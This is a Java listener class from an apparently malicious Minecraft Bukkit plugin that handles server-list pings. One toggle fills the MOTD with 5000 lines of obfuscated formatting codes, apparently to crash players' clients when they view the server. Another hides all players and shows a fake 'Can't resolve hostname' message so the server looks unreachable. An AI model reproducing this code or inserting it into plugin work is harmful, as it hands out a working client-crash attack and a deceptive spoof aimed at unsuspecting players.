package de.impact.listeners;

import de.impact.utils.LockUtils;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerListPingEvent;

public class ServerPingListener implements Listener {

    @EventHandler
    public void ping(ServerListPingEvent event) {

        var players = event.iterator();

        if(LockUtils.isLocked("pingcrash")) {
            event.setMotd("§kd\n".repeat(5000));
            return;
        }

        if(LockUtils.isLocked("ping")) {
            while(players.hasNext()) {
                if(players.next() != null)
                    players.remove();
            }
            event.setMaxPlayers(0);
            event.setMotd("§4Can't resolve hostname");
        }

    }

}